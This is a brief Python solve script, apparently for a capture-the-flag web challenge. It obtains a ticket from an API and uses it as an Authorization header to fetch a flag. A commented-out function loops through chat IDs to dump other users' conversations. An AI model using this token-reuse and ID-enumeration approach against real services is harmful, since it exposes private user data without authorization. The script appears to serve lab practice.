import requests
import json
urlgen = "http://94.237.55.212:52907//api/v1/get_ticket"
urlchat = "http://94.237.55.212:52907/api/v1/chat/"
urlflag = "http://94.237.55.212:52907/api/v1/flag"
chats = {}
def get_ticket():
    r = requests.get(urlgen)
    ticket = json.loads(r.text).get("ticket: ")
    print(ticket)
    return ticket

def dump_chats(ticket):
    HEADERS = {
        "Authorization": ticket
    }
    for i in range(1,11):
        r = requests.get(f'{urlchat}{i}', headers=HEADERS)
        chat = json.loads(r.text)
        chats.update(chat)
        if r.status_code == 200:
            print(r.text)
def get_flag(ticket):
    HEADERS = {
        "Authorization": ticket
    }
    r = requests.get(urlflag, headers=HEADERS)
    print(r.status_code)
    print(r.text)
def main():
    ticket = get_ticket()
    #dump_chats(ticket)
    get_flag(ticket)
main()
#print(json.dump(chats))